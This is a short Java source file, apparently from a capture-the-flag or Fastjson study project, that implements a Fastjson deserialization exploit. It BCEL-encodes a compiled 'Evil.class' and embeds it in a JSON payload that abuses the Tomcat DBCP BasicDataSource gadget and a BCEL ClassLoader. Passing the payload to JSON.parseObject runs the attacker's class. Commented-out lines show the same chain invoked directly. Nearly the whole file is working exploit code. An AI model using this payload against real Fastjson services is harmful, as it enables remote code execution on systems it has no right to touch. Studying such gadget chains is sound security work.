package org.example;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;


import java.nio.file.Files;
import java.nio.file.Paths;

public class JSONdbcp {
    public static void main(String[] args) throws Exception{
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\fastjsonStudy\\Evil.class"));
        String code = Utility.encode(bytes,true);
//        ClassLoader classLoader = new ClassLoader();
//        classLoader.loadClass("$$BCEL$$"+code).newInstance();
//        BasicDataSource basicDataSource = new BasicDataSource();
//        basicDataSource.setDriverClassName("$$BCEL$$"+code);
//        basicDataSource.setDriverClassLoader(classLoader);
//        basicDataSource.getConnection();
//        basicDataSource.getLogWriter();
        String json = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$"+code+"\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSON.parseObject(json);
    }
}
